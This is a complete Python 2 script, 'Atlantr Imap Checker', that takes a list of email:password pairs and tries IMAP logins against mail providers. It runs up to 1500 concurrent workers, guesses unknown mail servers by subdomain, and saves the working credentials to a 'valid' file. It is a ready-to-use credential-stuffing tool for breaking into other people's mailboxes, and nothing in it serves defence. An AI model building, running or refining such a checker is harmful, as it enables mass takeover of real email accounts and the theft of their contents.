#!/usr/bin/python
#- * -coding: utf-8 - * -
import sys
import os
import time
from timeit import default_timer as timer
import imaplib
import itertools
import argparse
import logging
from logging.handlers import RotatingFileHandler
import socket

from tqdm import tqdm #pip install tqdm
import gevent #pip install gevent
from gevent.queue import *
import gevent.monkey

socket.setdefaulttimeout(3)
gevent.monkey.patch_all()


print """
       db              88                                           
      d88b       ,d    88                         ,d                
     d8'`8b      88    88                         88                
    d8'  `8b   MM88MMM 88 ,adPPYYba, 8b,dPPYba, MM88MMM 8b,dPPYba,  
   d8YaaaaY8b    88    88 ""     `Y8 88P'   `"8a  88    88P'   "Y8  
  d8""""""""8b   88    88 ,adPPPPP88 88       88  88    88          
 d8'        `8b  88,   88 88,    ,88 88       88  88,   88          
d8'          `8b "Y888 88 `"8bbdP"Y8 88       88  "Y888 88          
      Imap checker v2.0                          by sup3ria
"""


parser = argparse.ArgumentParser(description='Atlantr Imap Checker 1.1')
parser.add_argument('-i','--input', help="Inputfile", required=False,type=str,default="mail_pass.txt")
parser.add_argument('-o','--output', help='Outputfile', required=False,type=str,default="mail_pass_valid.txt")
parser.add_argument('-t','--threads', help='Number of Greenlets spawned', required=False,type=int,default="512")
parser.add_argument('-uh','--unknownhosts', help='Check for unknown hosts', required=False,type=bool,default=False)
parser.add_argument('-l','--logging', help='Linecount logging', required=False,type=bool,default=False)
parser.add_argument('-lsize','--logfilesize', help='Size of logfile in MB', required=False,type=int,default="5")
parser.add_argument('-gm','--ghostmode', help='Continues linecount without userinput', required=False,type=bool,default=False)
parser.add_argument('-iu','--invunma', help='Log invalid an unmatched accounts.', required=False,type=bool,default=True)


args = vars(parser.parse_args())

file_in = args['input']
file_out = args['output']
workers = args['threads']
phosts = args['unknownhosts']
llog = args['logging']
logfilesize = args['logfilesize']
ghsme = args['ghostmode']
invunma = args['invunma']

if workers > 1500:
    print "Threads are limited to 1500. Use hp-mode otherwise.."
    wokers = 1500

logger1 = logging.getLogger("valid Log")
logger1.setLevel(logging.DEBUG)
handler1 = logging.FileHandler(file_out)
logger1.addHandler(handler1)

if invunma:
    logger3 = logging.getLogger("unmatched Log")
    logger3.setLevel(logging.DEBUG)
    handler1 = logging.FileHandler((file_in[:-4]+'_unmatched.txt'))
    logger3.addHandler(handler1)

    logger4 = logging.getLogger("invalid Log")
    logger4.setLevel(logging.DEBUG)
    handler1 = logging.FileHandler((file_in[:-4]+'_invalid.txt'))
    logger4.addHandler(handler1)


if llog:
    logger2 = logging.getLogger("Rotating Log")
    logger2.setLevel(logging.DEBUG)
    handler2 = RotatingFileHandler("count.log", maxBytes=logfilesize*1024*1024, backupCount=1)
    logger2.addHandler(handler2)

def imap(usr, pw, host):
    usr = usr.lower()
    try:
        mail = imaplib.IMAP4_SSL(str(host))
        a = str(mail.login(usr, pw))
        return a[2: 4]
    except imaplib.IMAP4.error:
        return False
    except:
        return "Error"

def init_ImapConfig():
    global ImapConfig
    ImapConfig = {}
    with open("hoster.txt", "r") as f:
      for line in f:
          if len(line)>1:
              hoster = line.strip().split(':')
              ImapConfig[hoster[0]] = hoster[1]

def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return ImapConfig[hoster]
    except:
        return False

def yes_or_no(question):
    reply = str(raw_input(question+' (y/n): ')).lower().strip()
    if reply[0] == 'y':
        return True
    if reply[0] == 'n':
        return False
    else:
        return yes_or_no("Uhhhh... please enter ")


def get_lineCount():
    try:
        a=open('count.log','rb')
        lines = a.readlines()
        if lines:
            last_line = lines[-1]
            a.close()
            return int(last_line.strip())
        else:
            return 0
    except:
        return 0

def getunknown_imap(subb):
    print "Gttin"
    sub = ['imap','mail','pop','pop3','imap-mail','inbound','mx','imaps','smtp','m']
    for host in sub:
        host = host+'.'+subb
        try:
            mail = imaplib.IMAP4_SSL(str(host))
            a = str(mail.login('test', 'test'))
        except imaplib.IMAP4.error:
            return host
        except:
            pass
    return False

def sub_worker(task):
    global count_valid
    global count_invalid
    global count_unmatched
    count_valid = 0
    count_invalid = 0
    count_unmatched = 0
    task2 = task.split(':')
    host = get_imapConfig(task2[0])
    if phosts:
        if host == False:
            o = getunknown_imap(task2[0])
            if o != False:
                host = o
    if host == False:
        logger3.debug(task)
        count_unmatched = count_unmatched + 1
        return False
    l = imap(task2[0], task2[1], host)
    if l == 'OK':
        logger1.debug(task)
        count_valid = count_valid + 1
        pbar2.update()
    if l == False:
        logger4.debug(task)
        count_invalid = count_invalid  + 1
    if l == "Error":
        #q.put(task)
        return False

def worker():
    global line_count
    line_count = 0
    while not q.empty():
        task = q.get()
        s = True
        try:
            s = sub_worker(task)
        finally:
            pbar.update()
            line_count += 1
            if llog:
                logger2.debug(line_count)

def loader():
    par1 = get_lineCount()
    if par1 != 0:
        if ghsme == False:
            yes = yes_or_no("Resume old line-count?:")
        else:
            yes = True

        if yes == False:
            os.remove("count.log")
            par1 = 0
    #print "Preparing list (this might take a while)."
    with open(file_in, "r") as text_file:
        for line in itertools.islice(text_file, par1, None):
            if len(line.strip()) > 1 and ':' in line.strip():
                try:
                    if '@' in line.split(':')[1] and '.' not in line.split(':')[0]:
                        a = line.split(':')[0].strip()
                        b = line.split(':')[1].strip()
                        line = b.lower()+':'+a
                    q.put(line.strip(),timeout=3)
                except:
                    pass

def asynchronous():
    threads = []
    for i in range(0, workers):
        threads.append(gevent.spawn(worker))
    start = timer()
    gevent.joinall(threads,raise_error=True)
    end = timer()
    pbar.close()
    pbar2.close()
    print "\nFound",count_valid, "valid Accounts.","\n(",count_invalid,'invalid and for',count_unmatched,'no settings were found.)'
    print "\nTime passed: " + str(end - start)[:6]


init_ImapConfig()
q = gevent.queue.JoinableQueue()
gevent.spawn(loader).join()
pbar = tqdm(total=q.qsize())
pbar2 = tqdm(total=q.qsize(),bar_format="  Valid:{n_fmt}")
asynchronous()

try:
    os.remove("count.log")
except:
    pass
